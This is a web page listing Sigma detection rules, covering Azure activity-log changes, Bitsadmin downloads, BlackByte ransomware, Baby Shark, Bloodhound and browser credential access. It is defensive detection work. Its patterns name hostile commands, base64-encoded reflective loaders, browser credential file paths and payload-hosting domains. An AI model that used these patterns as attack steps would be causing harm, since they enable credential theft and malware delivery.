<li><a href="#">title:Azure Owner Removed From Application or Service Principal id: 636e30d5-3736-42ea-96b1-e6e2f8429fd6 description: Identifies when a owner is was removed from a application or service principal in Azure. author: Austin Songer @austinsonger status: experimental date: 2021/09/03 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: - Remove owner from service principal - Remove owner from application condition: selection level: medium tags: - attack.defense_evasion falsepositives: - Owner being removed may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Owner removed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Point-to-site VPN Modified or Deleted id: d9557b75-267b-4b43-922f-a775e2d1f792 description: Identifies when a Point-to-site VPN is Modified or Deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/08 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: - MICROSOFT.NETWORK/P2SVPNGATEWAYS/WRITE - MICROSOFT.NETWORK/P2SVPNGATEWAYS/DELETE - MICROSOFT.NETWORK/P2SVPNGATEWAYS/RESET/ACTION - MICROSOFT.NETWORK/P2SVPNGATEWAYS/GENERATEVPNPROFILE/ACTION - MICROSOFT.NETWORK/P2SVPNGATEWAYS/DISCONNECTP2SVPNCONNECTIONS/ACTION - MICROSOFT.NETWORK/P2SVPNGATEWAYS/PROVIDERS/MICROSOFT.INSIGHTS/DIAGNOSTICSETTINGS/WRITE condition: selection level: medium tags: - attack.impact falsepositives: - Point-to-site VPN being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Point-to-site VPN modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Service Principal Created id: 0ddcff6d-d262-40b0-804b-80eb592de8e3 description: Identifies when a service principal is created in Azure. author: Austin Songer @austinsonger status: experimental date: 2021/09/02 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: 'Add service principal' condition: selection level: medium tags: - attack.defense_evasion falsepositives: - Service principal being created may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Service principal created from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Service Principal Removed id: 448fd1ea-2116-4c62-9cde-a92d120e0f08 description: Identifies when a service principal was removed in Azure. author: Austin Songer @austinsonger status: experimental date: 2021/09/03 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: Remove service principal condition: selection level: medium tags: - attack.defense_evasion falsepositives: - Service principal being removed may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Service principal removed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Subscription Permission Elevation Via ActivityLogs id: 09438caa-07b1-4870-8405-1dbafe3dad95 status: experimental author: Austin Songer @austinsonger date: 2021/11/26 description: Detects when a user has been elevated to manage all Azure Subscriptions. This change should be investigated immediately if it isn't planned. This setting could allow an attacker access to Azure subscriptions in your environment. references: - logsource: product: azure service: activitylogs detection: selection1: properties.message: MICROSOFT.AUTHORIZATION/ELEVATEACCESS/ACTION condition: selection1 level: high falsepositives: - If this was approved by System Administrator. tags: - attack.initial_access - attack.t1078 
<li><a href="#">title:Azure Subscription Permission Elevation Via AuditLogs id: ca9bf243-465e-494a-9e54-bf9fc239057d status: experimental author: Austin Songer @austinsonger date: 2021/11/26 description: Detects when a user has been elevated to manage all Azure Subscriptions. This change should be investigated immediately if it isn't planned. This setting could allow an attacker access to Azure subscriptions in your environment. references: - logsource: product: azure service: auditlogs detection: selection: Category: 'Administrative' OperationName: 'Assigns the caller to user access admin' condition: selection level: high falsepositives: - If this was approved by System Administrator. tags: - attack.initial_access - attack.t1078 
<li><a href="#">title:Azure Suppression Rule Created id: 92cc3e5d-eb57-419d-8c16-5c63f325a401 description: Identifies when a suppression rule is created in Azure. Adversary's could attempt this to evade detection. author: Austin Songer status: experimental date: 2021/08/16 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: MICROSOFT.SECURITY/ALERTSSUPPRESSIONRULES/WRITE condition: selection level: medium tags: - attack.impact falsepositives: - Suppression Rule being created may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Suppression Rule created from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Unusual Authentication Interruption id: 8366030e-7216-476b-9927-271d79f13cf3 status: experimental author: Austin Songer @austinsonger date: 2021/11/26 description: Detects when there is a interruption in the authentication process. references: - logsource: product: azure service: signinlogs detection: selection1: ResultType: 50097 ResultDescription: 'Device authentication is required' selection2: ResultType: 50155 ResultDescription: 'DeviceAuthenticationFailed' selection3: ResultType: 50158 ResultDescription: 'ExternalSecurityChallenge - External security challenge was not satisfied' condition: selection1 or selection2 or selection3 level: medium falsepositives: - Unknown tags: - attack.initial_access - attack.t1078 
<li><a href="#">title:Azure Virtual Network Device Modified or Deleted id: 15ef3fac-f0f0-4dc4-ada0-660aa72980b3 description: Identifies when a virtual network device is being modified or deleted. This can be a network interface, network virtual appliance, virtual hub, or virtual router. author: Austin Songer @austinsonger status: experimental date: 2021/08/08 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: - MICROSOFT.NETWORK/NETWORKINTERFACES/TAPCONFIGURATIONS/WRITE - MICROSOFT.NETWORK/NETWORKINTERFACES/TAPCONFIGURATIONS/DELETE - MICROSOFT.NETWORK/NETWORKINTERFACES/WRITE - MICROSOFT.NETWORK/NETWORKINTERFACES/JOIN/ACTION - MICROSOFT.NETWORK/NETWORKINTERFACES/DELETE - MICROSOFT.NETWORK/NETWORKVIRTUALAPPLIANCES/DELETE - MICROSOFT.NETWORK/NETWORKVIRTUALAPPLIANCES/WRITE - MICROSOFT.NETWORK/VIRTUALHUBS/DELETE - MICROSOFT.NETWORK/VIRTUALHUBS/WRITE - MICROSOFT.NETWORK/VIRTUALROUTERS/WRITE - MICROSOFT.NETWORK/VIRTUALROUTERS/DELETE condition: selection level: medium tags: - attack.impact falsepositives: - Virtual Network Device being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Virtual Network Device modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Virtual Network Modified or Deleted id: bcfcc962-0e4a-4fd9-84bb-a833e672df3f description: Identifies when a Virtual Network is modified or deleted in Azure. author: Austin Songer @austinsonger status: experimental date: 2021/08/08 references: - logsource: product: azure service: activitylogs detection: selection: properties.message|startswith: - MICROSOFT.NETWORK/VIRTUALNETWORKGATEWAYS/ - MICROSOFT.NETWORK/VIRTUALNETWORKS/ properties.message|endswith: - /WRITE - /DELETE condition: selection level: medium tags: - attack.impact falsepositives: - Virtual Network being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Virtual Network modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure VPN Connection Modified or Deleted id: 61171ffc-d79c-4ae5-8e10-9323dba19cd3 description: Identifies when a VPN connection is modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/08 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: - MICROSOFT.NETWORK/VPNGATEWAYS/VPNCONNECTIONS/WRITE - MICROSOFT.NETWORK/VPNGATEWAYS/VPNCONNECTIONS/DELETE condition: selection level: medium tags: - attack.impact falsepositives: - VPN Connection being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - VPN Connection modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:AzureHound PowerShell Commands id: 83083ac6-1816-4e76-97d7-59af9a9ae46e status: experimental description: Detects the execution of AzureHound in PowerShell, a tool to gather data from Azure for BloodHound references: - - author: Austin Songer (@austinsonger) date: 2021/10/23 modified: 2022/01/12 logsource: product: windows category: ps_script definition: Script Block Logging must be enabled detection: selection: ScriptBlockText|contains: Invoke-AzureHound condition: selection tags: - attack.discovery - attack.t1482 - attack.t1087 - attack.t1087.001 - attack.t1087.002 - attack.t1069.001 - attack.t1069.002 - attack.t1069 falsepositives: - Unknown level: high 
<li><a href="#">title:Baby Shark Activity id: 2b30fa36-3a18-402f-a22d-bf4ce2189f35 status: test description: Detects activity that could be related to Baby Shark malware author: Florian Roth references: - date: 2019/02/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine: - reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" - powershell.exe mshta.exe http* - cmd.exe /c taskkill /im cmd.exe condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.003 - attack.t1059.001 - attack.discovery - attack.t1012 - attack.defense_evasion - attack.t1218.005 
<li><a href="#">title:BabyShark Agent Pattern id: 304810ed-8853-437f-9e36-c4975c3dfd7e status: experimental description: Detects Baby Shark C2 Framework communication patterns author: Florian Roth date: 2021/06/09 references: - logsource: category: proxy detection: selection: c-uri|contains: 'momyshark?key=' condition: selection falsepositives: - Unknown level: critical tags: - attack.command_and_control - attack.t1071.001 
<li><a href="#">title:Backup Catalog Deleted id: 9703792d-fd9a-456d-a672-ff92efe4806a status: experimental description: Detects backup catalog deletions references: - (v=ws.11).aspx - author: Florian Roth (rule), Tom U. @c_APT_ure (collection) date: 2017/05/12 modified: 2021/10/13 tags: - attack.defense_evasion - attack.t1070.004 logsource: product: windows service: application detection: selection: EventID: 524 Provider_Name: Microsoft-Windows-Backup condition: selection falsepositives: - Unknown level: medium 
<li><a href="#">title:Bad Opsec Defaults Sacrificial Processes With Improper Arguments id: a7c3d773-caef-227e-a7e7-c2f13c622329 status: experimental related: - id: f5647edc-a7bf-4737-ab50-ef8c60dc3add type: obsoletes description: 'Detects attackers using tooling with bad opsec defaults e.g. spawning a sacrificial process to inject a capability into the process without taking into account how the process is normally run, one trivial example of this is using rundll32.exe without arguments as a sacrificial process (default in CS, now highlighted by c2lint), running WerFault without arguments (Kraken - credit am0nsec), and other examples.' author: Oleg Kolesnikov @securonix invrep_de, oscd.community, Florian Roth, Christian Burkard date: 2020/10/23 modified: 2021/09/01 references: - - - - - - - tags: - attack.defense_evasion - attack.t1218.011 logsource: category: process_creation product: windows detection: selection1: Image|endswith: '\WerFault.exe' CommandLine|endswith: '\WerFault.exe' selection2: Image|endswith: '\rundll32.exe' CommandLine|endswith: '\rundll32.exe' selection3: Image|endswith: '\regsvcs.exe' CommandLine|endswith: '\regsvcs.exe' selection4: Image|endswith: '\regasm.exe' CommandLine|endswith: '\regasm.exe' selection5: Image|endswith: '\regsvr32.exe' CommandLine|endswith: '\regsvr32.exe' condition: 1 of selection* fields: - ParentImage - ParentCommandLine falsepositives: - Unlikely level: high 
<li><a href="#">title:Bad Opsec Powershell Code Artifacts id: 8d31a8ce-46b5-4dd6-bdc3-680931f1db86 related: - id: 73e733cc-1ace-3212-a107-ff2523cc9fc3 type: derived description: Focuses on trivial artifacts observed in variants of prevalent offensive ps1 payloads, including Cobalt Strike Beacon, PoshC2, Powerview, Letmein, Empire, Powersploit, and other attack payloads that often undergo minimal changes by attackers due to bad opsec. status: experimental references: - - - author: 'ok @securonix invrep_de, oscd.community' date: 2020/10/09 modified: 2021/10/16 tags: - attack.execution - attack.t1059.001 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection_4103: Payload|contains: - '$DoIt' - 'harmj0y' - 'mattifestation' - '_RastaMouse' - 'tifkin_' - '0xdeadbeef' condition: selection_4103 falsepositives: - 'Moderate-to-low; Despite the shorter length/lower entropy for some of these, because of high specificity, fp appears to be fairly limited in many environments.' level: critical 
<li><a href="#">title:Base64 Encoded Listing of Shadowcopy id: 47688f1b-9f51-4656-b013-3cc49a166a36 status: test description: Detects base64 encoded listing Win32_Shadowcopy author: Christian Burkard date: 2022/03/01 modified: 2022/03/07 tags: - attack.execution - attack.t1059.001 - attack.defense_evasion - attack.t1027 references: - logsource: category: process_creation product: windows detection: selection: # Win32_Shadowcopy | ForEach-Object CommandLine|contains: - 'VwBpAG4AMwAyAF8AUwBoAGEAZABvAHcAYwBvAHAAeQAgAHwAIABGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQA' - 'cAaQBuADMAMgBfAFMAaABhAGQAbwB3AGMAbwBwAHkAIAB8ACAARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0A' - 'XAGkAbgAzADIAXwBTAGgAYQBkAG8AdwBjAG8AcAB5ACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdA' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unlikely level: high 
<li><a href="#">title:Base64 Encoded Reflective Assembly Load id: 62b7ccc9-23b4-471e-aa15-6da3663c4d59 status: test description: Detects base64 encoded .NET reflective loading of Assembly author: "Christian Burkard, pH-T" related: - id: 9c0295ce-d60d-40bd-bd74-84673b7592b1 type: similar date: 2022/03/01 modified: 2022/05/20 tags: - attack.execution - attack.t1059.001 - attack.defense_evasion - attack.t1027 references: - - logsource: category: process_creation product: windows detection: selection: CommandLine|contains: # [Reflection.Assembly]::Load( - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA' - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA' - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA' # [reflection.assembly]::("Load") - 'AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC' - 'BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp' - 'AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK' # [Reflection.Assembly]::("Load") - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ' - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA' - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA' # [reflection.assembly]::Load( - 'WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA' - 'sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA' - 'bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA' condition: selection fields: - CommandLine falsepositives: - Unlikely level: high 
<li><a href="#">title:'Binary Padding' id: 95361ce5-c891-4b0a-87ca-e24607884a96 status: test description: 'Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This rule detect using dd and truncate to add a junk data to file.' author: 'Igor Fits, Mikhail Larin, oscd.community' references: - date: 2020/10/19 modified: 2021/11/27 logsource: product: macos category: process_creation detection: selection1: Image|endswith: '/truncate' CommandLine|contains: '-s' selection2: Image|endswith: '/dd' CommandLine|contains: 'if=' filter: CommandLine|contains: 'of=' condition: selection1 or (selection2 and not filter) falsepositives: - Legitimate script work level: high tags: - attack.defense_evasion - attack.t1027.001 
<li><a href="#">title:'Binary Padding' id: c52a914f-3d8b-4b2a-bb75-b3991e75f8ba status: test description: 'Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This rule detect using dd and truncate to add a junk data to file.' author: 'Igor Fits, oscd.community' references: - date: 2020/10/13 modified: 2021/11/27 logsource: product: linux service: auditd detection: execve: type: 'EXECVE' truncate: - 'truncate' - '-s' dd: - 'dd' - 'if=' filter: - 'of=' condition: execve and (all of truncate or (all of dd and not filter)) falsepositives: - Legitimate script work level: high tags: - attack.defense_evasion - attack.t1027.001 
<li><a href="#">title:Bitlocker Key Retrieval id: a0413867-daf3-43dd-9245-734b3a787942 description: Monitor and alert for Bitlocker key retrieval. author: Michael Epping, '@mepples21' date: 2022/06/28 references: - logsource: product: azure service: auditlogs detection: selection: Category: KeyManagement OperationName: Read BitLocker key condition: selection falsepositives: - Unknown level: medium status: experimental tags: - attack.valid_accounts - attack.t1078 
<li><a href="#">title:Bitsadmin Download File from IP id: 99c840f2-2012-46fd-9141-c761987550ef status: experimental description: Detects usage of bitsadmin downloading a file using an URL that contains an IP references: - - - tags: - attack.defense_evasion - attack.persistence - attack.t1197 - attack.s0190 - attack.t1036.003 date: 2022/06/28 author: Florian Roth logsource: category: process_creation product: windows detection: selection: Image|endswith: '\bitsadmin.exe' CommandLine|contains: - ' /transfer ' - ' /create ' - ' /addfile ' selection_extension: CommandLine|contains: - '' - '' - '' - '' - '' - '' - '' - '' - '' - '' - '' - '' - '' - '' - '' - '' - '' - '' condition: all of selection* fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:Bitsadmin Download File with Suspicious Extension id: 5b80a791-ad9b-4b75-bcc1-ad4e1e89c200 status: experimental description: Detects usage of bitsadmin downloading a file with a suspicious extension references: - - - tags: - attack.defense_evasion - attack.persistence - attack.t1197 - attack.s0190 - attack.t1036.003 date: 2022/06/28 author: Florian Roth logsource: category: process_creation product: windows detection: selection: Image|endswith: '\bitsadmin.exe' CommandLine|contains: - ' /transfer ' - ' /create ' - ' /addfile ' selection_extension: CommandLine|contains: - '.asax' - '.ashx' - '.asmx' - '.asp' - '.aspx' - '.bat' - '.cfm' - '.cgi' - '.chm' - '.cmd' - '.gif' - '.jpeg' - '.jpg' - '.jsp' - '.jspx' - '.png' - '.ps1' - '.psm1' - '.scf' - '.sct' - '.txt' - '.vbe' - '.vbs' - '.war' - '.wsf' - '.wsh' - '.zip' - '.rar' - '.dll' condition: all of selection* fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:Bitsadmin Download from Suspicious Domain id: 8518ed3d-f7c9-4601-a26c-f361a4256a0c status: experimental description: Detects usage of bitsadmin downloading a file from a suspicious domain references: - - - tags: - attack.defense_evasion - attack.persistence - attack.t1197 - attack.s0190 - attack.t1036.003 date: 2022/06/28 author: Florian Roth logsource: category: process_creation product: windows detection: selection: Image|endswith: '\bitsadmin.exe' CommandLine|contains: - ' /transfer ' - ' /create ' - ' /addfile ' selection_domain: CommandLine|contains: - 'raw.githubusercontent.com' - 'gist.githubusercontent.com' - 'pastebin.com' - 'cdn.discordapp.com/attachments/' - 'mediafire.com' - 'mega.nz' - 'ddns.net' - '.paste.ee' - '.hastebin.com' - '.ghostbin.co/' - 'ufile.io' - 'storage.googleapis.com' condition: all of selection* fields: - CommandLine - ParentCommandLine falsepositives: - Some legitimate apps use this, but limited. level: medium 
<li><a href="#">title:Bitsadmin Download id: d059842b-6b9d-4ed1-b5c3-5b89143c6ede status: experimental description: Detects usage of bitsadmin downloading a file references: - - - tags: - attack.defense_evasion - attack.persistence - attack.t1197 - attack.s0190 - attack.t1036.003 date: 2017/03/09 modified: 2021/07/16 author: Michael Haag, FPT.EagleEye logsource: category: process_creation product: windows detection: selection1: Image|endswith: '\bitsadmin.exe' susp_flag_1: CommandLine|contains: ' /transfer ' susp_flag_2: CommandLine|contains: - ' /create ' - ' /addfile ' http_flag: CommandLine|contains: 'http' selection2: CommandLine|contains: 'copy bitsadmin.exe' condition: (selection1 and susp_flag_2 and http_flag) or (selection1 and susp_flag_1) or selection2 fields: - CommandLine - ParentCommandLine falsepositives: - Some legitimate apps use this, but limited. level: medium 
<li><a href="#">title:Bitsadmin Download to Suspicious Target Folder id: 2ddef153-167b-4e89-86b6-757a9e65dcac status: experimental description: Detects usage of bitsadmin downloading a file to a suspicious target folder references: - - - tags: - attack.defense_evasion - attack.persistence - attack.t1197 - attack.s0190 - attack.t1036.003 date: 2022/06/28 author: Florian Roth logsource: category: process_creation product: windows detection: selection: Image|endswith: '\bitsadmin.exe' CommandLine|contains: - ' /transfer ' - ' /create ' - ' /addfile ' selection_folder: CommandLine|contains: - 'C:\Users\Public\' - '%public%' - '\Desktop\' condition: all of selection* fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:Bitsadmin Download to Uncommon Target Folder id: 6e30c82f-a9f8-4aab-b79c-7c12bce6f248 status: experimental description: Detects usage of bitsadmin downloading a file to uncommon target folder references: - - - tags: - attack.defense_evasion - attack.persistence - attack.t1197 - attack.s0190 - attack.t1036.003 date: 2022/06/28 author: Florian Roth logsource: category: process_creation product: windows detection: selection: Image|endswith: '\bitsadmin.exe' CommandLine|contains: - ' /transfer ' - ' /create ' - ' /addfile ' selection_folder: CommandLine|contains: - 'C:\Windows\Temp\' - '%temp%' - 'C:\ProgramData\' - '%ProgramData%' - '\AppData\Local\' - '%AppData%' condition: all of selection* fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium 
<li><a href="#">title:Bitsadmin to Uncommon IP Server Address id: 8ccd35a2-1c7c-468b-b568-ac6cdf80eec3 status: experimental description: Detects Bitsadmin connections to IP addresses instead of FQDN names author: Florian Roth date: 2022/06/10 logsource: category: proxy detection: selection: c-useragent|startswith: 'Microsoft BITS/' cs-host|startswith: - '1' - '2' - '3' - '4' - '5' - '6' - '7' - '8' - '9' condition: selection falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1071.001 - attack.defense_evasion - attack.persistence - attack.t1197 - attack.s0190 
<li><a href="#">title:Bitsadmin to Uncommon TLD id: 9eb68894-7476-4cd6-8752-23b51f5883a7 status: experimental description: Detects Bitsadmin connections to domains with uncommon TLDs - - author: Florian Roth, Tim Shelton date: 2019/03/07 modified: 2022/05/09 logsource: category: proxy detection: selection: c-useragent|startswith: 'Microsoft BITS/' falsepositives: r-dns|endswith: - '.com' - '.net' - '.org' - '.scdn.co' # spotify streaming condition: selection and not falsepositives fields: - ClientIP - c-uri - c-useragent falsepositives: - Rare programs that use Bitsadmin and update from regional TLDs e.g. .uk or .ca level: high tags: - attack.command_and_control - attack.t1071.001 - attack.defense_evasion - attack.persistence - attack.t1197 - attack.s0190 
<li><a href="#">title:BlackByte Ransomware Patterns id: 999e8307-a775-4d5f-addc-4855632335be status: experimental description: This command line patterns found in BlackByte Ransomware operations author: Florian Roth references: - date: 2022/02/25 logsource: category: process_creation product: windows detection: selection1: Image|startswith: 'C:\Users\Public\' CommandLine|contains: ' -single ' selection2: CommandLine|contains: - 'del C:\Windows\System32\Taskmgr.exe' - ';Set-Service -StartupType Disabled $' - 'powershell -command "$x =[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(' - ' do start wordpad.exe /p ' condition: 1 of selection* fields: - ComputerName - User - CommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:Blackbyte Ransomware Registry id: 83314318-052a-4c90-a1ad-660ece38d276 description: BlackByte set three different registry values to escalate privileges and begin setting the stage for lateral movement and encryption author: frack113 date: 2022/01/24 modified: 2022/03/26 status: experimental references: - - logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject: - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLinkedConnections - HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\LongPathsEnabled Details: DWORD (0x00000001) condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:Bloodhound and Sharphound Hack Tool id: f376c8a7-a2d0-4ddc-aa0c-16c17236d962 status: test description: Detects command line parameters used by Bloodhound and Sharphound hack tools author: Florian Roth references: - - date: 2019/12/20 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image|contains: - '\Bloodhound.exe' - '\SharpHound.exe' selection2: CommandLine|contains: - ' -CollectionMethod All ' - '.exe -c All -d ' - 'Invoke-Bloodhound' - 'Get-BloodHoundData' selection3: CommandLine|contains|all: - ' -JsonFolder ' - ' -ZipFileName ' selection4: CommandLine|contains|all: - ' DCOnly ' - ' --NoSaveCache ' condition: 1 of selection* falsepositives: - Other programs that use these command line option and accepts an 'All' parameter level: high tags: - attack.discovery - attack.t1087.001 - attack.t1087.002 - attack.t1482 - attack.t1069.001 - attack.t1069.002 - attack.execution - attack.t1059.001 
<li><a href="#">title:Blue Mockingbird id: 92b0b372-a939-44ed-a11b-5136cf680e27 related: - id: c3198a27-23a0-4c2c-af19-e5328d49680e type: derived date: 2020/05/14 modified: 2022/06/26 status: experimental description: Attempts to detect system changes made by Blue Mockingbird references: - author: Trent Liffick (@tliffick) logsource: product: windows category: registry_set detection: selection: EventType: Setvalue TargetObject|endswith: '\CurrentControlSet\Services\wercplsupport\Parameters\ServiceDll' condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.t1112 - attack.t1047 
<li><a href="#">title:Blue Mockingbird id: c3198a27-23a0-4c2c-af19-e5328d49680e related: - id: ce239692-aa94-41b3-b32f-9cab259c96ea type: merged date: 2020/05/14 modified: 2021/09/11 status: experimental description: Attempts to detect system changes made by Blue Mockingbird references: - tags: - attack.execution - attack.t1112 - attack.t1047 author: Trent Liffick (@tliffick) logsource: category: process_creation product: windows detection: sc_cmd: Image|endswith: '\cmd.exe' CommandLine|contains|all: - 'sc config' - 'wercplsupporte.dll' wmic_cmd: Image|endswith: '\wmic.exe' CommandLine|endswith: 'COR_PROFILER' condition: sc_cmd or wmic_cmd falsepositives: - Unknown level: high 
<li><a href="#">title:BlueMashroom DLL Load id: bd70d3f8-e60e-4d25-89f0-0b5a9cff20e0 status: test description: Detects a suspicious DLL loading from AppData Local path as described in BlueMashroom report author: Florian Roth, Tim Shelton references: - date: 2019/10/02 modified: 2022/03/02 logsource: category: process_creation product: windows detection: selection: - CommandLine|contains|all: - '\regsvr32' - '\AppData\Local\' - CommandLine|contains|all: - '\AppData\Local\' - ',DllEntry' filter_1: - CommandLine|contains: 'AppData\Local\Microsoft\TeamsMeetingAddin\' - CommandLine|endswith: - '\x86\Microsoft.Teams.AddinLoader.dll' - '\x86\Microsoft.Teams.AddinLoader.dll"' - '\x64\Microsoft.Teams.AddinLoader.dll' - '\x64\Microsoft.Teams.AddinLoader.dll"' condition: selection and not 1 of filter* falsepositives: - Unlikely level: critical tags: - attack.defense_evasion - attack.t1218.010 
<li><a href="#">title:BPFtrace Unsafe Option Usage id: f8341cb2-ee25-43fa-a975-d8a5a9714b39 status: experimental description: Detects the usage of the unsafe bpftrace option author: Andreas Hunkeler (@Karneades) tags: - attack.execution - attack.t1059.004 references: - - date: 2022/02/11 logsource: category: process_creation product: linux detection: selection1: Image|endswith: 'bpftrace' CommandLine|contains: '--unsafe' condition: selection1 falsepositives: - Legitimate usage of the unsafe option level: medium 
<li><a href="#">title:Browser Credential Store Access id: 91cb43db-302a-47e3-b3c8-7ede481e27bf status: experimental description: Detects suspicious processes based on name and location that access the browser credential stores which can be the sign of credential stealing references: - - author: frack113 date: 2022/04/09 modified: 2022/06/29 tags: - attack.t1003 - attack.credential_access logsource: category: file_access product: windows detection: selection: - FileName|contains: - '\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies' - '\Appdata\Local\Chrome\User Data\Default\Login Data' - '\AppData\Local\Google\Chrome\User Data\Local State' - FileName|endswith: - '\Appdata\Local\Microsoft\Windows\WebCache\WebCacheV01.dat' - '\cookies.sqlite' - 'release\key3.db' #firefox - 'release\key4.db' #firefox - 'release\logins.json' #firefox filter_browser: Image|endswith: - '\firefox.exe' - '\chrome.exe' filter_programfile: Image|startswith: - 'C:\Program Files\' - 'C:\Program Files (x86)\' - 'C:\WINDOWS\system32\' filter_antimalware: Image|endswith: - '\MsMpEng.exe' - '\MpCopyAccelerator.exe' condition: selection and not 1 of filter_* falsepositives: - Antivirus, Anti-Spyware, Anti-Malware Software - Backup software level: medium 
<li><a href="#">title:Buffer Overflow Attempts id: 18b042f0-2ecd-4b6e-9f8d-aa7a7e7de781 status: stable description: Detects buffer overflow attempts in Unix system log files author: Florian Roth date: 2017/03/01 references: - logsource: product: linux detection: keywords: - 'attempt to execute code on stack by' - 'FTP LOGIN FROM .* 0bin0sh' - 'rpc.statd[\d+]: gethostbyname error for' - 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' condition: keywords falsepositives: - Unknown level: high tags: - attack.t1068 - attack.privilege_escalation 
<li><a href="#">title:Bypass UAC Using DelegateExecute id: 46dd5308-4572-4d12-aa43-8938f0184d4f description: Bypasses User Account Control using a fileless method author: frack113 date: 2022/01/05 modified: 2022/03/26 status: experimental references: - - - logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|endswith: \open\command\DelegateExecute Details: (Empty) condition: selection falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.defense_evasion - attack.t1548.002 
